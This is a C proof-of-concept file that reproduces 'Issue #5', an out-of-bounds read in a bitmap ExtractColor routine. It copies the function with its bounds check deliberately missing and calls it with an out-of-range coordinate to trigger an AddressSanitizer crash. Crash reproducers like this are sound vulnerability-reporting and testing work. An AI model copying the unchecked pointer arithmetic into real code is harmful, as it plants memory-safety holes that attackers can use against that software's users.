/*
 * POC for Issue #5: ExtractColor Buffer Overflow
 * CRASH VERSION - Will trigger ASAN
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    unsigned char r;
    unsigned char g;
    unsigned char b;
} wmfRGB;

typedef struct {
    unsigned char* image;
    int width;
    int height;
    int bytes_per_line;
    int bits_per_pixel;
    int NColors;
    wmfRGB* rgb;
} wmfBMPData;

typedef struct {
    int width;
    int height;
    wmfBMPData* data;
} wmfBMP;

void ExtractColor_vulnerable(wmfBMP* bmp, int x, int y, unsigned char* r, unsigned char* g, unsigned char* b) {
    wmfBMPData* data = bmp->data;
    unsigned char* p;

    // NO BOUNDS CHECKING - VULNERABILITY!
    switch (data->bits_per_pixel) {
        case 24:
            p = data->image + (y * data->bytes_per_line) + (x * 3);
            *b = p[0];  // Out-of-bounds read!
            *g = p[1];
            *r = p[2];
            break;
    }
}

int main() {
    printf("[*] POC for Issue #5: ExtractColor Buffer Overflow\n");
    printf("[*] CRASH VERSION - Will trigger ASAN\n\n");

    wmfBMP bmp;
    wmfBMPData data;

    bmp.width = 10;
    bmp.height = 10;
    bmp.data = &data;

    data.width = 10;
    data.height = 10;
    data.bits_per_pixel = 24;
    data.bytes_per_line = 10 * 3;
    data.image = (unsigned char*)malloc(10 * 10 * 3);

    if (!data.image) {
        printf("[-] Memory allocation failed\n");
        return 1;
    }

    memset(data.image, 0xAA, 10 * 10 * 3);

    printf("[+] Created 10x10 bitmap (300 bytes)\n");
    printf("[+] Image buffer: %p - %p\n", data.image, data.image + 300);

    // Test 1: Normal access (should work)
    printf("\n[*] Test 1: Normal access (5, 5)\n");
    unsigned char r, g, b;
    ExtractColor_vulnerable(&bmp, 5, 5, &r, &g, &b);
    printf("[+] Color at (5,5): R=%02X G=%02X B=%02X\n", r, g, b);

    // Test 2: Out-of-bounds Y coordinate - WILL CRASH
    printf("\n[*] Test 2: Out-of-bounds Y (5, 100) - WILL CRASH\n");
    printf("[!] Calculated offset: %d * %d + %d * 3 = %d bytes\n",
           100, data.bytes_per_line, 5, 100 * data.bytes_per_line + 5 * 3);
    printf("[!] Buffer size: 300 bytes - MASSIVE OVERFLOW!\n");
    printf("[!] Triggering crash...\n\n");

    ExtractColor_vulnerable(&bmp, 5, 100, &r, &g, &b);  // CRASH HERE!

    printf("[!] ERROR: Should have crashed but didn't!\n");
    free(data.image);
    return 0;
}
